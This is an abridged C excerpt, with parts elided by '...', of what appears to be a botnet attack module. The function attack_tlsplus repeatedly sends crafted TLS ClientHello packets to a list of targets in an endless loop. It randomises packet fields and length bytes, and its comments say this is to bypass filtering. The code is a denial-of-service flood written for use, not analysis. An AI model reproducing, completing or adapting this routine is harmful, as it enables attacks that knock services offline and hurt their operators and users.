...
void attack_tlsplus(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    ...
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 256);

    // TLS ClientHello with JNLP/Java-style variants for bypass
    unsigned char tlsplus_template[] = {
        0x16, 0x03, 0x01, 0x00, 0xC0,       // TLS record
        0x01, 0x00, 0x00, 0xBC,             // ClientHello
        0x03, 0x03,                         // TLS 1.2
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Random
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,       // Session ID
        0x00, 0x2A,                         // Cipher suites
        0xC0, 0x2B, 0xC0, 0x2F, 0xCC, 0xA9, 0xCC, 0xAA,
        0xC0, 0x0A, 0xC0, 0x09, 0xC0, 0x13, 0xC0, 0x14,
        0x00, 0x33, 0x00, 0x39, 0x00, 0x2F, 0x00, 0x35,
        0x00, 0x0A, 0x00, 0x05, 0x00, 0x04, 0x00, 0x16,
        0x00, 0x12, 0x00, 0x0D, 0x00, 0x0E, 0x00, 0x0F,
        0x00, 0x10, 0x00, 0x11,
        0x01, 0x00,                         // Compression
        0x00, 0x6C,                         // Extensions length
        0xFF, 0x01, 0x00, 0x01, 0x00,       // Renegotiation
        0x00, 0x17, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x14,
        0x00, 0x12, 0x04, 0x03, 0x04, 0x01, 0x05, 0x03,
        0x05, 0x01, 0x02, 0x03, 0x02, 0x01, 0x04, 0x02,
        ...
        0x00, 0x15, 0x00, 0x01, 0x01, 0x00, 0x33, 0x00,
        ...
        0x01, 0x06, 0x01, 0x03, 0x03, 0x02, 0x03, 0x03,
        0x01, 0x02, 0x01, 0x03, 0x02, 0x02, 0x04, 0x02,
        0x05, 0x02, 0x06, 0x02
    };
    int payload_len = sizeof(tlsplus_template);
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        util_memcpy(data, tlsplus_template, payload_len);
    }
    ...
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            ...
            *((uint32_t *)(data + 23)) = rand_next();
            ...
            // Randomize cipher suites slightly for bypass
            data[43] = (rand_next() % 4) + 0x2A;  // Cipher suite length varies
            data[67] = (rand_next() % 8) + 0x6C;  // Extension length varies
